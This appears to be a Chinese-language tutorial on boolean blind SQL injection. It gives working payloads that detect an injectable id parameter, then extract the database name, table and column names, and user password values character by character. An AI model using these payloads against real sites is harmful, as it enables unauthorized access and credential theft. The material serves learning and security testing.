### 基本过程

**注入点检测**

找到一个可以进行注入的参数位置，通常通过简单的测试 ```1=1```（始终为真）和 ```1=2```（始终为假）的情况观察响应的变化。例如：

```html
http://example.com/item?id=1 AND 1=1   --> 页面正常显示
http://example.com/item?id=1 AND 1=2   --> 页面异常或不同
```

如果响应页面存在显著差异，说明该参数存在布尔盲注的可能性。

------

**推测数据结构**      

使用逐步的逻辑表达式查询数据库元信息：

```sql
#推测当前使用的数据库：
id=1 AND DATABASE() LIKE 'test%'
```

判断当前数据库名是否以 `test` 开头。

```sql
#获取数据库长度：
id=1 AND LENGTH(DATABASE())=4
```

判断当前数据库名是否为 4 个字符 ，可以写成循环来判断。

```sql
#字符逐个推测： 假设数据库名长度为 4，逐字符尝试：
id=1 AND SUBSTRING(DATABASE(), 1, 1)='t'  --> 第一个字符是否是 't'
id=1 AND SUBSTRING(DATABASE(), 2, 1)='e'  --> 第二个字符是否是 'e'
id=1 AND SUBSTRING(DATABASE(), 3, 1)='s'  --> 第三个字符是否是 's'
id=1 AND SUBSTRING(DATABASE(), 4, 1)='t'  --> 第四个字符是否是 't'
```

------

**获取表名**   使用 ```information_schema.tables```  推测表名：

```sql
#获取表的数量：
id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=5
```

判断当前数据库中是否有 5 个表，可以写成循环来判断。

```sql
#获取表名长度：
id=1 AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1))=6
```

判断第一个表的名称长度为 6，可以写成循环来判断。

```sql
#推测表名字符：
id=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1)='u'
```

------

**获取字段名**

使用 ```information_schema.columns``` 获取字段名：

```sql
#获取字段数量：
id=1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users')=3
```

判断表 `users` 中是否有 3 个字段，可以写成循环来判断。

```sql
#获取字段名长度，可以写成循环来判断：
id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0,1))=5
```

```sql
#推测字段名字符，可以写成循环来判断：
id=1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0,1),1,1)='i'
```

------

**获取字段值**

使用逐字符猜测字段值：

 假设字段 ```password```在表```users```中：

```sql
#  获取字段值长度：
id=1 AND LENGTH((SELECT password FROM users LIMIT 0,1))=8
```

```sql
#  获取字段值字符：
id=1 AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='p'
```